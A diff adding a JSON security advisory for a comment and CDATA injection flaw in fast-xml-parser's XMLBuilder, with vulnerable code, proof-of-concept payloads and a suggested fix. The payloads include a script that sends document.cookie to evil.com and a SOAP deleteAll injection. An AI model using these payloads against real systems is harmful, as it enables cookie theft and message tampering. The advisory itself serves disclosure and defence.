@@ -1,0 +1,50 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-04-22T20:04:18Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "fast-xml-parser"
+  },
+  "Advisory": {
+    "DatabaseId": 350829,
+    "Id": "GSA_kwCzR0hTQS1naDRqLWdxdjItNDlmNs4ABVpt",
+    "GhsaId": "GHSA-gh4j-gqv2-49f6",
+    "References": [
+      {
+        "Url": "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gh4j-gqv2-49f6"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-gh4j-gqv2-49f6"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-gh4j-gqv2-49f6"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-41650"
+      }
+    ],
+    "Description": "# fast-xml-parser XMLBuilder: Comment and CDATA Injection via Unescaped Delimiters\n\n## Summary\n\nfast-xml-parser XMLBuilder does not escape the `--\u003e` sequence in comment content or the `]]\u003e` sequence in CDATA sections when building XML from JavaScript objects. This allows XML injection when user-controlled data flows into comments or CDATA elements, leading to XSS, SOAP injection, or data manipulation.\n\nExisting CVEs for fast-xml-parser cover different issues:\n- CVE-2023-26920: Prototype pollution (parser)\n- CVE-2023-34104: ReDoS (parser)\n- CVE-2026-27942: Stack overflow in XMLBuilder with preserveOrder\n- CVE-2026-25896: Entity encoding bypass via regex in DOCTYPE entities\n\nThis finding covers **unescaped comment/CDATA delimiters in XMLBuilder** - a distinct vulnerability.\n\n## Vulnerable Code\n\n**File**: `src/fxb.js`\n\n```javascript\n// Line 442 - Comment building with NO escaping of --\u003e\nbuildTextValNode(val, key, attrStr, level) {\n    // ...\n    if (key === this.options.commentPropName) {\n        return this.indentate(level) + `\u003c!--${val}--\u003e` + this.newLine;  // VULNERABLE\n    }\n    // ...\n    if (key === this.options.cdataPropName) {\n        return this.indentate(level) + `\u003c![CDATA[${val}]]\u003e` + this.newLine;  // VULNERABLE\n    }\n}\n```\n\nCompare with attribute/text escaping which IS properly handled via `replaceEntitiesValue()`.\n\n## Proof of Concept\n\n### Test 1: Comment Injection (XSS in SVG/HTML context)\n\n```javascript\nimport { XMLBuilder } from 'fast-xml-parser';\n\nconst builder = new XMLBuilder({\n  commentPropName: \"#comment\",\n  format: true,\n  suppressEmptyNode: true\n});\n\nconst xml = {\n  root: {\n    \"#comment\": \"--\u003e\u003cscript\u003ealert('XSS')\u003c/script\u003e\u003c!--\",\n    data: \"legitimate content\"\n  }\n};\n\nconsole.log(builder.build(xml));\n```\n\n**Output**:\n```xml\n\u003croot\u003e\n  \u003c!----\u003e\u003cscript\u003ealert('XSS')\u003c/script\u003e\u003c!----\u003e\n  \u003cdata\u003elegitimate content\u003c/data\u003e\n\u003c/root\u003e\n```\n\n### Test 2: CDATA Injection (RSS feed)\n\n```javascript\nconst builder = new XMLBuilder({\n  cdataPropName: \"#cdata\",\n  format: true,\n  suppressEmptyNode: true\n});\n\nconst rss = {\n  rss: { channel: { item: {\n    title: \"Article\",\n    description: {\n      \"#cdata\": \"Content]]\u003e\u003cscript\u003efetch('https://evil.com/'+document.cookie)\u003c/script\u003e\u003c![CDATA[more\"\n    }\n  }}}\n};\n\nconsole.log(builder.build(rss));\n```\n\n**Output**:\n```xml\n\u003crss\u003e\n  \u003cchannel\u003e\n    \u003citem\u003e\n      \u003ctitle\u003eArticle\u003c/title\u003e\n      \u003cdescription\u003e\n        \u003c![CDATA[Content]]\u003e\u003cscript\u003efetch('https://evil.com/'+document.cookie)\u003c/script\u003e\u003c![CDATA[more]]\u003e\n      \u003c/description\u003e\n    \u003c/item\u003e\n  \u003c/channel\u003e\n\u003c/rss\u003e\n```\n\n### Test 3: SOAP Message Injection\n\n```javascript\nconst builder = new XMLBuilder({\n  commentPropName: \"#comment\",\n  format: true\n});\n\nconst soap = {\n  \"soap:Envelope\": {\n    \"soap:Body\": {\n      \"#comment\": \"Request from user: --\u003e\u003csoap:Body\u003e\u003cAction\u003edeleteAll\u003c/Action\u003e\u003c/soap:Body\u003e\u003c!--\",\n      Action: \"getBalance\",\n      UserId: \"12345\"\n    }\n  }\n};\n\nconsole.log(builder.build(soap));\n```\n\n**Output**:\n```xml\n\u003csoap:Envelope\u003e\n  \u003csoap:Body\u003e\n    \u003c!--Request from user: --\u003e\u003csoap:Body\u003e\u003cAction\u003edeleteAll\u003c/Action\u003e\u003c/soap:Body\u003e\u003c!----\u003e\n    \u003cAction\u003egetBalance\u003c/Action\u003e\n    \u003cUserId\u003e12345\u003c/UserId\u003e\n  \u003c/soap:Body\u003e\n\u003c/soap:Envelope\u003e\n```\n\nThe injected `\u003cAction\u003edeleteAll\u003c/Action\u003e` appears as a real SOAP action element.\n\n## Tested Output\n\nAll tests run on Node.js v22, fast-xml-parser v5.5.12:\n\n```\n1. COMMENT INJECTION:\n   Injection successful: true\n\n2. CDATA INJECTION (RSS feed scenario):\n   Injection successful: true\n\n4. Round-trip test:\n   Injection present: true\n\n5. SOAP MESSAGE INJECTION:\n   Contains injected Action: true\n```\n\n## Impact\n\nAn attacker who controls data that flows into XML comments or CDATA sections via XMLBuilder can:\n\n1. **XSS**: Inject `\u003cscript\u003e` tags into XML/SVG/HTML documents served to browsers\n2. **SOAP injection**: Modify SOAP message structure by injecting XML elements\n3. **RSS/Atom feed poisoning**: Inject scripts into RSS feed items via CDATA breakout\n4. **XML document manipulation**: Break XML structure by escaping comment/CDATA context\n\nThis is practically exploitable whenever applications use XMLBuilder to generate XML from data that includes user-controlled content in comments or CDATA (e.g., RSS feeds, SOAP services, SVG generation, config files).\n\n## Suggested Fix\n\nEscape delimiters in comment and CDATA content:\n\n```javascript\n// For comments: replace -- with escaped equivalent\nif (key === this.options.commentPropName) {\n    const safeVal = String(val).replace(/--/g, '\u0026#45;\u0026#45;');\n    return this.indentate(level) + `\u003c!--${safeVal}--\u003e` + this.newLine;\n}\n\n// For CDATA: split on ]]\u003e and rejoin with separate CDATA sections\nif (key === this.options.cdataPropName) {\n    const safeVal = String(val).replace(/]]\u003e/g, ']]]]\u003e\u003c![CDATA[\u003e');\n    return this.indentate(level) + `\u003c![CDATA[${safeVal}]]\u003e` + this.newLine;\n}\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-22T20:04:17Z",
+    "Severity": "MODERATE",
+    "Summary": "fast-xml-parser XMLBuilder: XML Comment and CDATA Injection via Unescaped Delimiters",
+    "UpdatedAt": "2026-04-22T20:04:18Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 6.1,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.7.0"
+      },
+      "VulnerableVersionRange": "\u003c 5.7.0"
+    }
+  ]
+}
